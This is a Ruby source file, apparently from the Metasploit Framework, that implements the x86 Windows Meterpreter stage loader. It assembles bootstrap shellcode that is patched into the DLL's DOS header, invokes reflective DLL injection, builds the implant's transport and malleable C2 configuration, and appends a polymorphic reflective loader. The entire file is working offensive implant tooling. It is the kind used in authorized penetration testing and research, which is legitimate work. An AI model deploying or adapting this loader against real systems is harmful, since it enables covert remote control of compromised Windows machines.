# -*- coding: binary -*-


module Msf

###
#
# Common module stub for ARCH_X86 payloads that make use of Meterpreter.
#
###

module Payload::Windows::MeterpreterLoader

  include Msf::ReflectiveDLLLoader
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReflectiveLoader

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration RDI',
      'Description'   => 'Inject Meterpreter & the configuration stub via RDI',
      'Author'        => [ 'sf', 'OJ Reeves' ],
      'References'    => [
        [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ], # original
        [ 'URL', 'https://github.com/rapid7/ReflectiveDLLInjection' ] # customisations
      ],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'PayloadCompat' => { 'Convention' => 'sockedi handleedi -https', },
      'Stage'         => { 'Payload'   => "" }
      ))
  end

  def asm_invoke_metsrv(opts={})
    asm = %Q^
        ; prologue
          dec ebp               ; 'M'
          pop edx               ; 'Z'
          call $+5              ; call next instruction
          pop ebx               ; get the current location (+7 bytes)
          push edx              ; restore edx
          inc ebp               ; restore ebp
          push ebp              ; save ebp for later
          mov ebp, esp          ; set up a new stack frame
        ; Invoke ReflectiveLoader()
          ; add the offset to ReflectiveLoader() (0x????????)
          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
          call ebx              ; invoke ReflectiveLoader()
        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
          ; offset from ReflectiveLoader() to the end of the DLL
          add ebx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
    ^

    unless opts[:stageless] || opts[:force_write_handle] == true
      asm << %Q^
          mov [ebx], edi        ; write the current socket/handle to the config
      ^
    end

    asm << %Q^
          push ebx              ; push the pointer to the configuration start
          push 4                ; indicate that we have attached
          push eax              ; push some arbitrary value for hInstance
          call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
    ^
  end

  def stage_payload(opts={})
    stage_meterpreter(opts) + generate_config(opts)
  end

  def generate_config(opts={})
    ds = opts[:datastore] || datastore
    opts[:uuid] ||= generate_payload_uuid
    # Pass the malleable C2 profile through to the transport config so
    # that staged HTTP(S) meterpreter sessions honour the profile after
    # the stage is delivered. The option is only registered by HTTP(S)
    # stagers, so it's nil (and ignored) for other transports.
    opts[:c2_profile] ||= ds['MALLEABLEC2'] if options.include?('MALLEABLEC2')
    if opts[:c2_profile]
      opts[:stageless] = true
    end
    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      arch:              opts[:uuid].arch,
      null_session_guid: opts[:null_session_guid] == true,
      exitfunk:          ds[:exit_func] || ds['EXITFUNC'],
      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
      uuid:              opts[:uuid],
      transports:        opts[:transport_config] || [transport_config(opts)],
      extensions:        [],
      ext_format:        'x86.dll',
      stageless:         opts[:stageless] == true,
    }.merge(meterpreter_logging_config(opts))
    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it, prefixed with an 8-byte comms handle
    # that the stager patches with the active socket/handle
    "\x00" * 8 + config.to_b
  end

  def stage_meterpreter(opts={})
    ds = opts[:datastore] || datastore
    debug_build = ds['MeterpreterDebugBuild']
    loader = nil
    dll_path = MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll', debug: debug_build)
    dll = ::MetasploitPayloads::Crypto.decrypt(ciphertext: ::File.binread(dll_path))
    begin
      rdi_offset = parse_pe(dll)
    rescue
      rdi_offset = nil
    end

    # Prefer a site-local custom loader binary if the user has dropped one into
    # the meterpreter search paths (~/.msf4/user_data/meterpreter/ or
    # <msf>/data/meterpreter/); otherwise assemble the polymorphic reflective
    # loader on the fly.
    custom_loader_path = [
      ::MetasploitPayloads.user_meterpreter_dir,
      ::MetasploitPayloads.msf_meterpreter_dir
    ].map { |dir| ::File.join(dir, 'custom_loader.x86.bin') }.find { |p| ::File.readable?(p) }

    use_loader = false
    if custom_loader_path
      dlog("Using custom loader from #{custom_loader_path}")
      ::MetasploitPayloads.warn_local_path(custom_loader_path)
      loader = ::File.binread(custom_loader_path)
      use_loader = true
    end

    if rdi_offset.nil? && !use_loader
      loader = reflective_loader(iv: datastore_reflective_loader_iv(ds))
      use_loader = true
    end

    asm_opts = {
      rdi_offset: rdi_offset || dll.length, # the reflective loader is appended to the end of the DLL, so its offset within the payload equals the DLL length
      length:     dll.length + (loader ? loader.length : 0), # total payload length = DLL + reflective loader
      stageless:  opts[:stageless] == true
    }

    dlog("Using custom loader from #{custom_loader_path}") if custom_loader_path
    dlog('Using polymorphic reflective loader') if !custom_loader_path && use_loader
    dlog("Loader length: #{loader.length} bytes") if use_loader
    dlog("DLL length: #{dll.length} bytes")
    dlog("ReflectiveLoader offset: #{asm_opts[:rdi_offset]} bytes")
    dlog("Configuration offset: #{asm_opts[:length]} bytes")
    asm = asm_invoke_metsrv(asm_opts)

    # generate the bootstrap asm
    bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string

    # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
    if bootstrap.length > 62
      raise RuntimeError, "Meterpreter loader (x86) generated an oversized bootstrap!"
    end

    # patch the bootstrap code into the dll's DOS header...
    dll[ 0, bootstrap.length ] = bootstrap
    dll += loader if use_loader
    dll
  end

end

end

